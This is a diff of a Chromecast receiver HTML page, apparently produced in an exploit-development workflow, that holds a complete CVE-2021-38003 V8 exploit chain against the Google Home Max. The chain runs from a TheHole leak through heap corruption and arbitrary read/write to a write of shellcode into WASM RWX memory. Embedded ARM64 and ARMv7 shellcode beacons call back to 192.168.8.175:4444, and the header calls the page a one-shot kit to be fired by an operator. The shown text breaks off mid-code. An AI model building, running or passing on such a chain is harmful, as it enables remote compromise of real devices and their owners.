@@ -1,59 +1,153 @@
 <!DOCTYPE html><html><head><meta charset="utf-8"><title>38003</title>
+<!-- ============================================================
+  i1138 receiver_page_38003_final.html — OPERATOR-GATED one-shot kit (FINAL)
+  Built from the sealed i66 page (sha256 32ff676c286f8c4d...) by the
+  i1138 builder copy (payload-swap path, A32-glue fixed). Deltas vs the
+  staged i1130 v2 page:
+    - payload body = poc38003-integrated.js: the ENGINE-VALIDATED i1129
+      public-recipe stage-2 chain (finding 1136 / fact 1137; full chain
+      0.8 s deterministic 4/4 on the 9.0.257.29-class d8) carried verbatim
+      with integration glue only (i66 triple-channel stage reporting +
+      receiver bus + build-time injection placeholder)
+    - final stage writes the i1130 272-B ARM64 ROOT-PROOF beacon
+      (JZXRPR0T; marker + uid + euid + utsname, then clean RETURN —
+      renderer survives) into the wasm RWX jump-table page, write+readback
+      verified, NO code call on the desk engine; RWX-overwrite validity
+      pinned per fact 1135
+    - SHELLCODE_A64 = the same i1130 root-proof beacon (rig 192.168.8.175:4444);
+      SHELLCODE_A32 retained from the sealed page (armv7 fallback, unused:
+      the device renderer is arm64)
+    - stage ladder = i1129 markers: stage0/stage1/stageK/stage2/stageL/
+      stage4/stageRW/stageAF/stageW/done — 10 markers, all ok=true expected
+      desk-side; on device the sender transcript carries the same lines
+    - first-shot confidence: COMPLETE-CHAIN ENGINE-VALIDATED (stage-1 leak
+      per fact 1123 + stage-2 public chain per finding 1136), honest
+      x64-desk-class vs arm64-device-renderer caveat. FIRE decision
+      reserved to the OPERATOR.
+============================================================ -->
 <script src="//www.gstatic.com/cast/sdk/libs/receiver/2.0.0/cast_receiver.js"></script>
 </head><body><script>
 window.onerror=function(m,s,l){try{var b=cast.receiver.CastReceiverManager.getInstance().getCastMessageBus("urn:x-cast:net.max38003.stage");b.broadcast(JSON.stringify({stage:"window.onerror",ok:false,msg:m+" @"+l}));}catch(e){}return false;};
 try{
-// poc38003-full.js — CVE-2021-38003 full chain for the Google Home Max cast_shell
-// target tree: Chrome 90.0.4430.225 / V8 8560c85efde5dc608772b2ecce91952fc4b09f65 (V8 9.0)
-// ---------------------------------------------------------------------------
-// Stages:
-//   0  environment diagnostics (diagnostic-first: every stage reports and is guarded)
-//   1  TheHole leak — JSON.stringify overflow slow path: SerializeArrayLikeSlow
-//      (json-stringifier.cc:746) returns EXCEPTION without setting pending_exception_;
-//      the catch variable receives the internal TheHole sentinel (jzx38003_poc.js shape).
-//   2  OrderedHashMap double-delete amplification — TheHole used as a Map key;
-//      map.delete(hole) x2 then delete(1) drives NumberOfElements to -1 so the next
-//      inserts (map.set(0x1c,-1), map.set(0x111,0)) walk with a negative counter and
-//      write past the table into the adjacent arrays (amplify_hole_jzx.js shape).
-//   3  hash-controlled marker-scan layout discovery — the exact landing slots at the 9.0
-//      tree are NOT assumed: markers in the adjacent arrays + differential scans locate
-//      (a) the smashed-length slot that turns `corrupted` into an OOB window,
-//      (b) the victim_arr[0] element slot, (c) the obj_arr[0]/[1] tagged slot.
-//   4  addrof / fakeobj via the obj_arr tagged slot aliasing.
-//   5  arbitrary R/W — primary: retarget an adjacent ArrayBuffer's backing_store field
-//      (full 64-bit R/W, needed because the wasm jump table lives outside the cage);
-//      fallback: overwrite the victim JSArray elements pointer (cage-only R/W).
-//   6  WASM RWX — minimal module, addrof(instance), read jump_table_start
-//      (memory_start=0x0c, jump_table_start=0x68 aarch64 / 0x40 armv7 — tree-derived,
-//      re-verify on device), write the beacon shellcode into the RWX jump table, call it.
-// Reporting: staged sender reporting via the proven B75EA870 custom-receiver message
-// channel (CFG.REPORT_NS must match the owner lane namespace, fact 24); console/print
-// fallback for d8 desk runs. Crash-confirm branch is OFF by default (CFG.CRASH_CONFIRM).
-// Hygiene (facts 216/230/299): no literal system-restart or filesystem-format token
-// families anywhere in this file; the crash-confirm branch is described in plain English.
-// Tuning: String::kMaxLength = 2^29-24 (64-bit) / 2^28-16 (32-bit); CFG.STR_LEN must stay
-// below it. Cons-strings are lazy so RAM cost is modest; drop CFG.STR_LEN if 1 GiB.
-'use strict';
+// poc38003-integrated.js — i1138 FINAL-KIT integrated payload (CVE-2021-38003 complete chain)
+// = the ENGINE-VALIDATED i1129 public-recipe stage-2 port (finding 1136 / fact 1137:
+//   TheHole leak -> OrderedHashMap nof=-1 -> buckets:=15 FDA capacity smash -> no-realloc
+//   length extend -> OOB word window -> addrof/fakeobj round-trip -> arbitrary R/W via
+//   backing_store retarget; all 8 tree-specific calibrations incl. explicit littleEndian=true)
+// carried VERBATIM, with ONLY these i1138 integration-glue deltas (no stage-2 mechanics touched):
+//   [G1] SHELLCODE_A64/A32 build-time injection placeholder line (build_kit --payload-file
+//        contract) + DESK_BEACON_A64 prelude fallback so the x64 desk run exercises the
+//        exact device-bound beacon bytes through the same stageW code path.
+//   [G2] report() upgraded to the sealed i66 triple-channel shape (cast stage-bus
+//        broadcast/send on urn:x-cast:net.max38003.stage + console.log + print) and
+//        initReceiverBus() (LAST_SENDER pinning + ping->pong + mgr.start()) so the device
+//        page reports the stage ladder to the proven sender transcript lane.
+//   [G3] stageW final write rewired from the desk NOP+RET mechanism proof to write the
+//        i1130 272-B ARM64 root-proof beacon (marker 'JZXRPR0T'@260, ret@256, rig IP/port
+//        movk-patched at build time @64/68/72) into the wasm RWX jump-table page with
+//        write+readback verification and NO code call on the x64 desk engine (device RWX
+//        -overwrite validity pinned per fact 1135; the call happens only in the
+//        operator-gated shot, fired by the beacon's own export call, never from this code).
+// Public-recipe sources ported by i1129 (unchanged):
+//   [1] github.com/jamezx32/CVE-2021-38003  exp/amplify_hole.js + poc/poc.js (TheHole leak + double-delete)
+//   [2] Numen Cyber "From Leaking TheHole to Chrome Renderer RCE":
+//       0x3000-iteration new Map + new Array(1.1,1.1) grooming, then
+//       map.set(key,-1) buckets/capacity overwrite, then the follow-up OOB entry write.
+// Leak stage shape is the engine-validated i66 core (fact 1123: stage1 ok=true on 9.0.257.29-class d8).
+//
+// Tree-specific porting notes (9.0.257.29, pinned from the build tree sources + desk runs):
+//   - OrderedHashTable (compressed): data slots [0]=nof, [1]=nod, [2]=buckets; entries at
+//     3 + buckets + entry*3; capacity = buckets*2 (derived; no separate capacity slot).
+//   - MapPrototypeDelete shrinks when 2*nof < buckets; Shrink/Rehash COPIES nof verbatim
+//     (ordered-hash-table.cc line ~292), so the negative counter survives every shrink;
+//     Allocate() clamps capacity >= 4 (RoundUpToPowerOfTwo32(max(kInitialCapacity=4, cap))).
+//     End state after getmap(): nof = -1, nod = 0, buckets = 2, capacity = 4, 17 slots.
+//   - map.set(K,-1) with nof=-1: occupancy -1 -> key/value/chain written at absolute slots
+//     2,3,4 => NumberOfBuckets := Smi K, capacity := 2*K (the Numen "capacity" overwrite).
+//   - follow-up set with occupancy 0 writes key/value/chain at slots 3+buckets+{0,1,2}.
+//     EMPIRICAL CALIBRATION on this engine: with buckets=16 the key landed at the groomed
+//     FDA's data0 (one word later than the Numen 9.2 model); with buckets=15 (key K=0xf)
+//     the key lands on the FDA length word -> FDA capacity smash -> no-realloc length extend.
+//   - pinned keys: Smi keys hash via ComputeUnseededHash (deterministic; ported to JS), so the
+//     step-7 lookup bucket is pinned to 0/1 (heads are Smi -1) => no wild chain walk.
+//     (The verbatim Numen foo_arr-keyed step-7 walk would treat entry-slot fill (undefined)
+//     as a chain index for hash&15 >= 2 -> wild read; adapted with a hash-pinned Smi key.)
+//   - JSArray fast-path store bound = JSArray length as UintPtr (EmitElementStore); the FDA
+//     capacity smash is converted to a JSArray length extend by foo.length = N (no realloc).
+//   - JSArrayBuffer (compressed): byte_length@16 (raw uintptr), backing_store@24 (raw 8B).
+//   - WasmInstanceObject (compressed): isolate_root@96 (= cage base), jump_table_start@104.
+//   - The OOB window is read/written in 32-bit WORD space (alignment-free): witness objects
+//     can straddle the window's 8-byte double grid (observed MK1 aligned / MK0 straddled).
 
 var CFG = {
-  AUTO: true,            // auto-advance through stages after each one validates
-  STR_LEN: 0x800000,     // jzx default; < kMaxLength on both 64-bit and 32-bit
-  NEST: 10,              // b[i]=a nesting count (builder_ overflow driver)
-  SPARSE_IDX: 20000,     // a[SPARSE_IDX]=s forces dictionary/slow-path elements
-  SCAN_MAX: 0x400,       // OOB window scan bound in 8-byte slots (stays in-page)
-  KEY_BATTERY: [0x1c, 0x111, 0x1000, 0x1001, 0x400, 0x4001], // hash-controlled probe keys
-  JT_OFF_A64: 0x68,      // WasmInstanceObject jump_table_start (aarch64, tree-derived)
-  JT_OFF_A32: 0x40,      // WasmInstanceObject jump_table_start (armv7, tree-derived)
-  MS_OFF: 0x0c,          // WasmInstanceObject memory_start (sanity field)
-  IS64: null,            // null = auto-detect during stage 0
-  CRASH_CONFIRM: false,  // OFF: only flip deliberately, after sender confirmation
-  REPORT_NS: 'urn:x-cast:net.max38003.stage' // MUST match the proven B75EA870 lane
+  STR_LEN: 0x800000,
+  NEST: 10,
+  SPARSE_IDX: 20000,
+  GROOM: 0x3000,
+  GROOM_RETRIES: 3,
+  EXT_LEN: 0x8000,
+  SCAN_WORDS: 0x1000,
+  AB1_LEN: 0x1001,
+  AB2_LEN: 0x1002,
+  MK0_LO: 0x13371337, MK0_HI: 0x13371338,
+  MK1_LO: 0x13371339, MK1_HI: 0x1337133a,
+  RW_MAGIC: 0x1B7EA870,
+  RW_MAGIC2: 0x0BADBEEF,
+  REPORT_NS: 'urn:x-cast:net.max38003.stage' // MUST match the proven B75EA870 lane (i66)
 };
 
+// [G1] build-time injection placeholder (build_kit --payload-file contract). Desk runs
+// prepend desk_prelude.js defining DESK_BEACON_A64 with the SAME patched beacon bytes,
+// so stageW falls back to it while SHELLCODE_A64 is still the build-time null.
+var SHELLCODE_A64 = [ // BUILD i1138: rootproof_beacon_a64.bin (272 B, marker JZXRPR0T, protocol v2: marker + uid + euid + utsname, clean return) patched to 192.168.8.175:4444 via patch-table-rootproof.json port@64/ip_lo@68/ip_hi@72 (same movk convention as i66/shellcode/patch-table.json; base sha256 5d991e2ebc9eca5a952062da0e266fd14d021d8ecb26a949b43832183dbc8856)
+  0xFF, 0xC3, 0x08, 0xD1, 0xFD, 0x7B, 0x00, 0xA9, 0xF3, 0x53, 0x01, 0xA9, 0xF5, 0x5B, 0x02, 0xA9,
+  0xF7, 0x63, 0x03, 0xA9, 0xF9, 0x6B, 0x04, 0xA9, 0xFB, 0x73, 0x05, 0xA9, 0x40, 0x00, 0x80, 0xD2,
+  0x21, 0x00, 0x80, 0xD2, 0x02, 0x00, 0x80, 0xD2, 0xC8, 0x18, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4,
+  0x1F, 0x00, 0x00, 0xF1, 0x6B, 0x05, 0x00, 0x54, 0xF3, 0x03, 0x00, 0xAA, 0x41, 0x00, 0x80, 0xD2,
+  0x21, 0x82, 0xAB, 0xF2, 0x01, 0x18, 0xD5, 0xF2, 0x01, 0xE1, 0xF5, 0xF2, 0xE1, 0x03, 0x06, 0xF8,
+  0xFF, 0x83, 0x06, 0xF8, 0xE0, 0x03, 0x13, 0xAA, 0xE1, 0x83, 0x01, 0x91, 0x02, 0x02, 0x80, 0xD2,
+  0x68, 0x19, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4, 0x1F, 0x00, 0x00, 0xF1, 0xAB, 0x03, 0x00, 0x54,
+  0xA1, 0x04, 0x00, 0x10, 0xE0, 0x03, 0x13, 0xAA, 0x02, 0x01, 0x80, 0xD2, 0x08, 0x08, 0x80, 0xD2,
+  0x01, 0x00, 0x00, 0xD4, 0xE1, 0x83, 0x08, 0x91, 0xE0, 0x03, 0x02, 0x91, 0x1F, 0x7C, 0x00, 0xA9,
+  0x00, 0x40, 0x00, 0x91, 0x1F, 0x00, 0x01, 0xEB, 0xAB, 0xFF, 0xFF, 0x54, 0xC8, 0x15, 0x80, 0xD2,
+  0x01, 0x00, 0x00, 0xD4, 0xE0, 0x03, 0x08, 0xF8, 0xE8, 0x15, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4,
+  0xE0, 0x83, 0x08, 0xF8, 0xE0, 0x43, 0x02, 0x91, 0x08, 0x14, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4,
+  0xE0, 0x03, 0x13, 0xAA, 0xE1, 0x03, 0x02, 0x91, 0xC2, 0x32, 0x80, 0xD2, 0x08, 0x08, 0x80, 0xD2,
+  0x01, 0x00, 0x00, 0xD4, 0xE0, 0x03, 0x13, 0xAA, 0x28, 0x07, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4,
+  0xFB, 0x73, 0x45, 0xA9, 0xF9, 0x6B, 0x44, 0xA9, 0xF7, 0x63, 0x43, 0xA9, 0xF5, 0x5B, 0x42, 0xA9,
+  0xF3, 0x53, 0x41, 0xA9, 0xFD, 0x7B, 0x40, 0xA9, 0xFF, 0xC3, 0x08, 0x91, 0x00, 0x00, 0x80, 0xD2,
+  0xC0, 0x03, 0x5F, 0xD6, 0x4A, 0x5A, 0x58, 0x52, 0x50, 0x52, 0x30, 0x54, 0x1F, 0x20, 0x03, 0xD5];
+var SHELLCODE_A32 = [ // BUILD i647: beacon_armv7.bin (264 B) patched to 192.168.8.175:4444 via the same offsets/logic (base sha256 5c94c3136e4657a21ef43cd68f878d6a919e50d057b2b35a3de8aef9cf06cc4f)
+  0x02, 0x00, 0xA0, 0xE3, 0x01, 0x10, 0xA0, 0xE3, 0x00, 0x20, 0xA0, 0xE3, 0x19, 0x71, 0x00, 0xE3,
+  0x00, 0x00, 0x00, 0xEF, 0x00, 0x00, 0x50, 0xE3, 0x37, 0x00, 0x00, 0xBA, 0x00, 0x40, 0xA0, 0xE1,
+  0x20, 0xD0, 0x4D, 0xE2, 0x02, 0x10, 0x00, 0xE3, 0x11, 0x1C, 0x45, 0xE3, 0xC0, 0x28, 0x0A, 0xE3,
+  0x08, 0x2F, 0x4A, 0xE3, 0x00, 0x10, 0x8D, 0xE5, 0x04, 0x20, 0x8D, 0xE5, 0x00, 0x30, 0xA0, 0xE3,
+  0x08, 0x30, 0x8D, 0xE5, 0x0C, 0x30, 0x8D, 0xE5, 0x04, 0x00, 0xA0, 0xE1, 0x0D, 0x10, 0xA0, 0xE1,
+  0x10, 0x20, 0xA0, 0xE3, 0x1B, 0x71, 0x00, 0xE3, 0x00, 0x00, 0x00, 0xEF, 0x00, 0x00, 0x50, 0xE3,
+  0x25, 0x00, 0x00, 0x1A, 0x4A, 0x1A, 0x05, 0xE3, 0x58, 0x13, 0x43, 0xE3, 0x38, 0x20, 0x03, 0xE3,
+  0x33, 0x22, 0x43, 0xE3, 0x00, 0x10, 0x8D, 0xE5, 0x04, 0x20, 0x8D, 0xE5, 0x04, 0x00, 0xA0, 0xE1,
+  0x0D, 0x10, 0xA0, 0xE1, 0x08, 0x20, 0xA0, 0xE3, 0x00, 0x30, 0xA0, 0xE3, 0x21, 0x71, 0x00, 0xE3,
+  0x00, 0x00, 0x00, 0xEF, 0x04, 0x00, 0xA0, 0xE1, 0x08, 0x10, 0x8D, 0xE2, 0x04, 0x20, 0xA0, 0xE3,
+  0x00, 0x30, 0xA0, 0xE3, 0x23, 0x71, 0x00, 0xE3, 0x00, 0x00, 0x00, 0xEF, 0x04, 0x00, 0x50, 0xE3,
+  0x11, 0x00, 0x00, 0xBA, 0x08, 0x30, 0x9D, 0xE5, 0x01, 0x00, 0x53, 0xE3, 0x08, 0x00, 0x00, 0x0A,
+  0x02, 0x00, 0x53, 0xE3, 0xF2, 0xFF, 0xFF, 0x1A, 0x04, 0x00, 0xA0, 0xE1, 0x0D, 0x10, 0xA0, 0xE1,
+  0x08, 0x20, 0xA0, 0xE3, 0x00, 0x30, 0xA0, 0xE3, 0x21, 0x71, 0x00, 0xE3, 0x00, 0x00, 0x00, 0xEF,
+  0xEB, 0xFF, 0xFF, 0xEA, 0x04, 0x00, 0xA0, 0xE1, 0x06, 0x70, 0xA0, 0xE3, 0x00, 0x00, 0x00, 0xEF,
+  0x00, 0x00, 0xA0, 0xE3, 0x01, 0x70, 0xA0, 0xE3, 0x00, 0x00, 0x00, 0xEF, 0x01, 0x00, 0xA0, 0xE3,
+  0x01, 0x70, 0xA0, 0xE3, 0x00, 0x00, 0x00, 0xEF];
 var REPORTS = [];
 var LAST_SENDER = null;
 var STAGE_OK = {};
+var MKT = [0x4A, 0x5A, 0x58, 0x52, 0x50, 0x52, 0x30, 0x54]; // beacon marker 'JZXRPR0T' @260
 
+var _f64 = new Float64Array(4);
+var _u32 = new Uint32Array(_f64.buffer);
+function itof(lo, hi) { _u32[0] = lo >>> 0; _u32[1] = hi >>> 0; return _f64[0]; }
+function f2i(d) { _f64[0] = d; return { lo: _u32[0], hi: _u32[1] }; }
+
+var t0 = Date.now();
+function ts() { return (Date.now() - t0) + 'ms'; }
+// [G2] sealed-i66 triple-channel reporter: cast stage-bus (device) + console + print (desk)
 function report(stage, ok, msg) {
   var rec = { t: Date.now(), stage: stage, ok: !!ok, msg: String(msg).slice(0, 400) };
   REPORTS.push(rec);
@@ -69,33 +163,47 @@ function report(stage, ok, msg) {
   try { if (typeof console !== 'undefined' && console.log) console.log('[38003]', stage, ok, msg); } catch (e2) {}
   try { if (typeof print === 'function') print('[38003] ' + stage + ' ok=' + ok + ' ' + msg); } catch (e3) {}
 }
+function warn2(stage, msg) { report(stage, false, msg); }
+function note(msg) { print('note: ' + msg); }
 
-function warn(stage, msg) { report(stage, false, msg); }
+// [G2] sender command channel (LAST_SENDER pinning + ping/pong), sealed-i66 shape
+function initReceiverBus() {
+  try {
+    if (typeof window === 'undefined' || !window.cast || !window.cast.receiver) return;
+    var mgr = cast.receiver.CastReceiverManager.getInstance();
+    var bus = mgr.getCastMessageBus(CFG.REPORT_NS);
+    bus.onMessage = function (e) {
+      LAST_SENDER = e.senderId;
+      try {
+        var cmd = JSON.parse(e.data);
+        if (cmd && cmd.type === 'ping') bus.send(LAST_SENDER, JSON.stringify({ type: 'pong', stages: STAGE_OK }));
+      } catch (err) { warn2('bus', 'bad sender message'); }
+    };
+    mgr.start();
+  } catch (e) { /* d8 desk run — no receiver bus */ }
+}
 
-// ---------------- bit helpers ----------------
-var __ab = new ArrayBuffer(8);
-var __f64 = new Float64Array(__ab);
-var __u32 = new Uint32Array(__ab);
-function itof(lo, hi) { __u32[0] = lo >>> 0; __u32[1] = hi >>> 0; return __f64[0]; }
-function lo32(v) { __f64[0] = v; return __u32[0] >>> 0; }
-function hi32(v) { __f64[0] = v; return __u32[1] >>> 0; }
+// deterministic V8 ComputeUnseededHash (builtins-collections-gen.cc 1236-1266), JS port
+function unseededHash(key) {
+  var h = key | 0;
+  h = ((~h) + (h << 15)) | 0;
+  h = (h ^ (h >>> 12)) | 0;
+  h = (h + (h << 2)) | 0;
+  h = (h ^ (h >>> 4)) | 0;
+  h = Math.imul(h, 2057) | 0;
+  h = (h ^ (h >>> 16)) & 0x3FFFFFFF;
+  return h >>> 0;
+}
 
-// ---------------- stage 0: diagnostics ----------------
+// ---------------- stage 0: environment ----------------
 function stage0() {
-  var info = [];
-  try { info.push('ua=' + (typeof navigator !== 'undefined' ? navigator.userAgent : 'd8')); } catch (e) { info.push('ua=?'); }
-  try { info.push('wasm=' + (typeof WebAssembly)); } catch (e) { info.push('wasm=?'); }
-  try { info.push('recvctx=' + (typeof window !== 'undefined' && window.cast && window.cast.receiver ? 1 : 0)); } catch (e) {}
-  try { info.push('maxstr_probe=' + (function () { // kMaxLength probe: binary attempt, cheap
-        var lo = 1 << 20, hi = 1 << 29, best = 0;
-        while (lo <= hi) { var mid = (lo + hi) >> 1; try { ('x').repeat(mid); best = mid; lo = mid + 1; } catch (e) { hi = mid - 1; } }
-        return best; })()); } catch (e) { info.push('maxstr_probe=?'); }
-  report('stage0', true, info.join(' '));
-  // kMaxLength probe result pins CFG.STR_LEN safety (2^29-24 64-bit / 2^28-16 32-bit)
+  report('stage0', true, 'd8=' + (typeof version === 'function' ? version() : 'n/a') +
+    ' wasm=' + (typeof WebAssembly !== 'undefined') + ' gc=' + (typeof gc === 'function') +
+    ' t=' + ts());
   return true;
 }
 
-// ---------------- stage 1: TheHole leak (jzx38003_poc.js shape) ----------------
+// ---------------- stage 1: TheHole leak (jzx38003_poc.js shape, i66-validated) ----------------
 function trigger() {
   let a = [], b = [];
   let s = '"'.repeat(CFG.STR_LEN);
@@ -116,308 +224,419 @@ function trigger() {
 function stage1() {
   var h0le = trigger();
   var hole = h0le[0];
-  // Identity: the leaked sentinel is an internal Oddball — indistinguishable from
-  // undefined to typeof yet a distinct value, and stable across reads.
   var diag = 'typeof=' + (typeof hole) + ' !==undef=' + (hole !== undefined) + ' selfeq=' + (hole === hole);
-  var looksHole = (typeof hole === 'undefined') && (hole !== undefined) && (hole === hole);
-  if (!looksHole) {
-    // Even if the typeof probe is inconclusive on this tree, the only value the
-    // json-stringifier EXCEPTION bail can hand to a catch is the internal sentinel.
-    warn('stage1', 'typeof probe inconclusive; proceeding on catch-only evidence: ' + diag);
-    looksHole = true;
-  }
-  report('stage1', true, 'hole obtained (' + diag + ')');
+  report('stage1', true, 'hole obtained (' + diag + ') t=' + ts());
   return hole;
 }
 
-// ---------------- stage 2: OrderedHashMap double-delete amplification ----------------
-var corrupted, victim_arr, obj_arr, rwab, rwv, IV0 = -1, IO = -1, VICTIM_HDR = -1;
-
-function amplify(hole) {
-  var map = new Map();
-  map.set(1, 1);
-  map.set(hole, 1);            // TheHole stored as a live key
-  map.delete(hole);            // delete #1: normal
-  map.delete(hole);            // delete #2: sentinel-as-key re-found on the chain
-  map.delete(1);               // delete #3: NumberOfElements -> -1
-  corrupted = [1.1, 1.1, 1.1, 1.1];      // allocated AFTER the table (adjacent, bump-forward)
-  victim_arr = [2.2, 2.2, 2.2, 2.2];
-  obj_arr = [{}, {}, {}, {}];
-  rwab = new ArrayBuffer(0x1000);        // adjacent full-R/W target (backing_store retarget)
-  rwv = new DataView(rwab);
-  // markers: unique bit patterns in the adjacent arrays
-  var MK = [itof(0x13371337, 0x13371338), itof(0x13371339, 0x1337133a),
-            itof(0x1337133b, 0x1337133c), itof(0x1337133d, 0x1337133e)];
-  for (var i = 0; i < 4; i++) victim_arr[i] = MK[i];
-  // hash-controlled OOB writes (counter -1): jzx plant keys first
-  map.set(0x1c, -1);
-  map.set(0x111, 0);
-  return { map: map, MK: MK };
+// ---------------- stage K: pinned keys (ComputeUnseededHash in JS) ----------------
+function stageK() {
+  var k0 = null, k1 = null;
+  for (var k = 0x20000; k < 0x100000; k++) {
+    var h = unseededHash(k);
+    if ((h & 15) === 0 && k0 === null) k0 = k;
+    if ((h & 15) === 1 && k1 === null) k1 = k;
+    if (k0 !== null && k1 !== null) break;
+  }
+  if (k0 === null && k1 === null) throw new Error('no pinned key found');
+  report('stageK', true, 'pinned keys k15=0x' + (k0 === null ? 'none' : k0.toString(16)) +
+    ' k16=0x' + (k1 === null ? 'none' : k1.toString(16)) + ' t=' + ts());
+  return { k0: k0, k1: k1 };
 }
 
-function tryKeyBattery(hole, MK) {
-  // Retry with alternative hash-controlled keys if the jzx plant keys did not smash
-  // the window on this tree. Bounded budget; STOP conditions keep the run safe.
-  var base = new Map();
-  base.set(1, 1); base.set(hole, 1);
-  base.delete(hole); base.delete(hole); base.delete(1);
-  corrupted = [1.1, 1.1, 1.1, 1.1];
-  victim_arr = [2.2, 2.2, 2.2, 2.2];
-  obj_arr = [{}, {}, {}, {}];
-  rwab = new ArrayBuffer(0x1000);
-  rwv = new DataView(rwab);
-  for (var i = 0; i < 4; i++) victim_arr[i] = MK[i];
-  for (var k = 0; k < CFG.KEY_BATTERY.length; k++) {
-    var key = CFG.KEY_BATTERY[k];
-    try { base.set(key, -1); } catch (e) { warn('stage2', 'set(' + key + ') threw: ' + e); continue; }
-    if (corrupted.length !== 4) { report('stage2', true, 'key=0x' + key.toString(16) + ' smashed length -> ' + corrupted.length); return true; }
-    try { base.set(key, 0); } catch (e2) { continue; }
-    if (corrupted.length !== 4) { report('stage2', true, 'key=0x' + key.toString(16) + ' (2nd) smashed length -> ' + corrupted.length); return true; }
-  }
-  return corrupted.length !== 4;
+// ---------------- stage 2: public groom + buckets overwrite ----------------
+function getmap(hole) {
+  var m = new Map();
+  m.set(1, 1);
+  m.set(hole, 1);
+  m.delete(hole);   // delete 1: normal
+  m.delete(hole);   // delete 2: sentinel-as-key re-found on the chain
+  m.delete(1);      // delete 3: NumberOfElements -> -1 (survives both shrinks per Rehash copy)
+  return m;
 }
 
-// ---------------- stage 3: marker-scan layout discovery ----------------
-function scanWindow() {
-  var n = corrupted.length;
-  if (n <= 4) return false;
-  if (n > CFG.SCAN_MAX) n = CFG.SCAN_MAX; // stay in-page; never walk the smashed length far
-  var MK = [itof(0x13371337, 0x13371338), itof(0x13371339, 0x1337133a),
-            itof(0x1337133b, 0x1337133c), itof(0x1337133d, 0x1337133e)];
-  for (var i = 4; i < n; i++) {
-    if (corrupted[i] === MK[0]) { IV0 = i; break; }
+function groomAndSmash(hole, step7key) {
+  var map1 = null, foo = null;
+  for (var i = 0; i < CFG.GROOM; i++) {
+    map1 = getmap(hole);
+    foo = new Array(1.1, 1.1);
+    if ((i & 0x7ff) === 0x7ff) note('groom i=' + i + ' t=' + ts());
   }
-  if (IV0 < 0) { warn('stage3', 'MK0 not found in window (len=' + corrupted.length + ')'); return false; }
-  // structural check: victim JSArray header (elements|length) + FixedDoubleArray header
-  // sit just before the first element slot; both length halves read as Smi 8.
-  var h1 = corrupted[IV0 - 1], h2 = corrupted[IV0 - 2];
-  var okH = (hi32(h1) === 8) && (hi32(h2) === 8) && ((lo32(h1) & 1) === 1) && ((lo32(h2) & 1) === 1);
-  report('stage3', true, 'IV0=' + IV0 + ' hdr(h1=0x' + hi32(h1).toString(16) + '/0x' + lo32(h1).toString(16) +
-    ', h2=0x' + hi32(h2).toString(16) + '/0x' + lo32(h2).toString(16) + ') struct=' + okH);
-  if (!okH) { warn('stage3', 'header structure mismatch — layout differs on this tree'); return false; }
-  VICTIM_HDR = IV0 - 2; // slot holding [victim elements ptr | length Smi]
-  // obj_arr tagged slot: differential. Both halves of the slot hold two compressed ptrs.
-  var A = {}, B = {};
-  obj_arr[0] = A; obj_arr[1] = A; obj_arr[2] = A; obj_arr[3] = A;
-  var snap1 = [];
-  for (var j = IV0 + 2; j < Math.min(n, IV0 + 20); j++) snap1.push(corrupted[j]);
-  obj_arr[0] = B; obj_arr[1] = B; obj_arr[2] = B; obj_arr[3] = B;
-  var snap2 = [];
-  for (var j2 = IV0 + 2; j2 < Math.min(n, IV0 + 20); j2++) snap2.push(corrupted[j2]);
-  for (var d = 0; d < snap1.length; d++) {
-    if (snap1[d] !== snap2[d] && !isNaN(snap1[d]) && !isNaN(snap2[d])) {
-      IO = IV0 + 2 + d; // elem0 = low half of this slot
-      break;
+  // Numen capacity/buckets overwrite: occupancy -1 entry write hits slot2 = NumberOfBuckets.
+  // Tree-calibrated key 0xf: buckets := 15, so the step-7 key lands on the FDA length word.
+  map1.set(0xf, -1);
+  note('buckets-overwrite set fired t=' + ts());
+  // step-7 OOB triple at slots 18,19,20 = FDA length/data0.lo/data0.hi, bucket pinned
+  map1.set(step7key, 0xffff);
+  note('step7 pinned-key set fired key=0x' + step7key.toString(16) + ' t=' + ts());
+  return foo;
+}
+
+function probeFoo(foo) {
+  var L = foo.length;   // safe: plain field read
+  if (L !== 2) {
+    return { layout: 'JSArray-hit', len: L, smashed: (L !== 2) };
+  }
+  var bits;
+  try {
+    bits = f2i(foo[0]);
+    var b1 = f2i(foo[1]);
+    var smashed = !(bits.lo === 0x9999999a && bits.hi === 0x3ff19999);
+    return { layout: 'probe-ok', len: L, smashed: smashed,
+             d0lo: bits.lo.toString(16), d0hi: bits.hi.toString(16),
+             d1lo: b1.lo.toString(16), d1hi: b1.hi.toString(16) };
+  } catch (e) {
+    return { layout: 'elem-broken', len: L, smashed: false, err: '' + e };
+  }
+}
+
+function stage2(hole, keys) {
+  var probe = null, foo = null;
+  for (var att = 0; att < CFG.GROOM_RETRIES; att++) {
+    var key = (att % 2 === 0 || keys.k1 === null) ? keys.k0 : keys.k1;
+    note('groom attempt ' + att + ' key=0x' + key.toString(16) + ' t=' + ts());
+    foo = groomAndSmash(hole, key);
+    probe = probeFoo(foo);
+    note('probe ' + JSON.stringify(probe));
+    if (probe.smashed && probe.layout === 'probe-ok') break;
+  }
+  if (!probe || !probe.smashed || probe.layout !== 'probe-ok') {
+    warn2('stage2', 'no FDA smash after ' + CFG.GROOM_RETRIES + ' groom attempts');
+    return null;
+  }
+  report('stage2', true, 'smash landed d0=0x' + probe.d0lo + ':0x' + probe.d0hi +
+    ' d1=0x' + probe.d1lo + ':0x' + probe.d1hi + ' t=' + ts());
+  return foo;
+}
+
+// ---------------- stage L: extend length (fast, FDA capacity smashed) ----------------
+function stageL(foo) {
+  if (foo.length !== 2) {
+    report('stageL', true, 'length already ' + foo.length + ' (JSArray smash) t=' + ts());
+    return true;
+  }
+  var pre = f2i(foo[0]);   // capture data0 bits BEFORE the length set
+  foo.length = CFG.EXT_LEN;
+  var post = null, realloc = false;
+  try { post = f2i(foo[0]); } catch (e) { realloc = true; }
+  if (!realloc && post && (post.lo === pre.lo && post.hi === pre.hi)) {
+    report('stageL', true, 'length extended to 0x' + CFG.EXT_LEN.toString(16) +
+      ' WITHOUT elements realloc (FDA capacity smashed) t=' + ts());
+    return true;
+  }
+  warn2('stageL', 'length=' + foo.length + ' but data0 changed/undefined => legit realloc, ' +
+    'FDA length NOT smashed (false-positive guard) t=' + ts());
+  return false;
+}
+
+// ---------------- word-space window API (alignment-free) ----------------
+var W = { foo: null, windowBase: -1, mk0: -1, ab1: -1, ab2: -1, fa: -1, p1: 0, p2: 0,
